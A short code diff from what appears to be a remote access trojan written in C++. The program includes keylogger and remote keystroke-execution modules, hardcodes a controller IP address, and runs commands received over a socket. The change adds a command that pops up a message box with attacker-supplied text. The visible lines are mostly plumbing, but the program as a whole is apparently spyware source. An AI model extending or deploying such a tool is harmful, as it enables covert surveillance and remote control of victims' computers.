@@ -16,6 +16,7 @@
 #include "Keylogger/KeyLogger.h"
 #include "keyboard/KeyboardExecuter.h"
 #include "permission/Permission.h"
+#include "box_message/MessageBoxGUI.h"
 
 #define IP "192.168.1.133"
 
@@ -271,11 +272,18 @@ int main() {
                             stream.sendSize(result);
                             break;
                         }
-
+                        case 21:{
+                            std::cout << "SHOW MESSAGE BOX " << std::endl;
+                            std::string boxInformation = stream.readString();
+                            MessageBoxGUI messageBox(boxInformation);
+                            messageBox.showMessageGUI();
+                            break;
+                        }
                         default: {
                             streamListening = false;
                             break;
                         }
+
                     }
                 }
                 closesocket(sock);
